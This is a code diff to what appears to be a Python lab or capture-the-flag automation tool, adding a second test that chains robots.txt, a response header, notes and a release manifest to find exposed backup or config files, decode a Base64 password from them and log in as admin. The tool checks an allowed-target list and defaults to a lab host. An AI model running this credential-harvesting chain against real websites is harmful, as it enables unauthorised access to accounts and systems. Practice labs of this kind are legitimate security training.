@@ -85,6 +85,8 @@ DEFAULT_EXTENSIONS = [
 
 B64_LINE_RE = re.compile(r"(?im)^\s*([A-Z0-9_]*(?:PASSWORD|PASS|SECRET|TOKEN)[A-Z0-9_]*)\s*=\s*([A-Za-z0-9+/=]{8,})\s*$")
 SUCCESS_TEXT = "TEST 1 SUCCESS, WELCOME BACK HACKER!"
+TEST2_SUCCESS_TEXT = "TEST 2 SUCCESS, ACCESS CHAIN COMPLETE!"
+PATH_RE = re.compile(r"/[-A-Za-z0-9_./]+")
 
 
 @dataclass
@@ -193,6 +195,78 @@ class HXTerminal:
         return False
 
 
+    def run_test2_auto(self, start_url: str) -> bool:
+        base_url = normalize_base_url(start_url)
+        assert_allowed_target(base_url)
+        print(f"[test2] target: {base_url}")
+        print("[test2] tracing robots/header clue chain...")
+        login_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "test2/login")
+        login = self.request(login_url)
+        build = header_get(login.headers, "x-hx-build")
+        if login.status != 200 or not build:
+            print(f"[test2] missing Test 2 login/header clue; status={login.status}")
+            return False
+        print("[test2] login/header clue recovered")
+
+        robots = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", "robots.txt"))
+        if robots.status != 200:
+            print(f"[test2] robots.txt unavailable; status={robots.status}")
+            return False
+        note_paths = [p for p in PATH_RE.findall(robots.text) if p.startswith("/test2/")]
+        if not note_paths:
+            print("[test2] no Test 2 path found in robots.txt")
+            return False
+        print("[test2] robots clue recovered")
+
+        manifest_path: Optional[str] = None
+        for note_path in note_paths:
+            note = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", note_path.lstrip("/")))
+            if note.status == 200 and build in note.text:
+                candidates = [p for p in PATH_RE.findall(note.text) if p.startswith("/test2/")]
+                for candidate in candidates:
+                    if build in candidate:
+                        manifest_path = candidate
+                        break
+            if manifest_path:
+                break
+        if not manifest_path:
+            manifest_path = f"/test2/releases/{build}.manifest"
+        print("[test2] notes/build clue recovered")
+
+        manifest = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", manifest_path.lstrip("/")))
+        if manifest.status != 200:
+            print(f"[test2] manifest unavailable; status={manifest.status}")
+            return False
+        artifact_paths = [p for p in PATH_RE.findall(manifest.text) if p.startswith("/test2/") and ("bak" in p or "config" in p)]
+        if not artifact_paths:
+            print("[test2] no backup/config artifact path found in manifest")
+            return False
+        print("[test2] manifest clue recovered")
+
+        secret: Optional[str] = None
+        secret_key: Optional[str] = None
+        for artifact_path in artifact_paths:
+            artifact = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", artifact_path.lstrip("/")))
+            if artifact.status == 200:
+                found = extract_b64_secret(artifact.text)
+                if found:
+                    secret_key, secret = found
+                    break
+        if not secret:
+            print("[test2] no Base64 credential marker found in chained artifact")
+            return False
+        print(f"[test2] credential marker found: {secret_key}")
+        print("[test2] decoded credential recovered")
+
+        body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
+        res = self.request(login_url, method="POST", data=body)
+        if TEST2_SUCCESS_TEXT in res.text:
+            print(TEST2_SUCCESS_TEXT)
+            return True
+        print(f"[test2] login did not reach success page; status={res.status} size={res.size}")
+        return False
+
+
 def is_generic_block(res: HttpResult) -> bool:
     text = res.text[:6000]
     if res.status == 403 and "cloudflare" in text.lower() and "attention required" in text.lower():
@@ -211,6 +285,18 @@ def extract_b64_secret(text: str) -> Optional[tuple[str, str]]:
             continue
         if 6 <= len(decoded) <= 128 and all(ch not in decoded for ch in "\r\n\x00"):
             return key, decoded
+    return None
+
+
+def header_get(headers: object, name: str) -> Optional[str]:
+    wanted = name.lower()
+    try:
+        items = headers.items()  # type: ignore[attr-defined]
+    except Exception:
+        return None
+    for key, value in items:
+        if str(key).lower() == wanted:
+            return str(value)
     return None
 
 
@@ -304,7 +390,8 @@ def admin_menu() -> None:
     while True:
         print("\nADMIN PLAN - FULL LAB AUTOMATION")
         print("1) Auto-run HXSecurity Test 1")
-        print("2) Show registered tests")
+        print("2) Auto-run HXSecurity Test 2")
+        print("3) Show registered tests")
         print("0) Exit")
         choice = input("hxsecurity> ").strip()
         if choice == "1":
@@ -312,9 +399,13 @@ def admin_menu() -> None:
             ok = term.run_test1_auto(url)
             print("[result] PASS" if ok else "[result] FAIL")
         elif choice == "2":
+            url = input("Start URL/domain: ").strip() or "https://lab.hxsecurity.net/test2/login"
+            ok = term.run_test2_auto(url)
+            print("[result] PASS" if ok else "[result] FAIL")
+        elif choice == "3":
             print("Registered tests:")
             print("- test1: exposed backup/config artifact with Base64 credential, admin login validation")
-            print("- test2: planned")
+            print("- test2: chained robots/header/manifest clue with Base64 credential, admin login validation")
         elif choice == "0":
             return
         else:
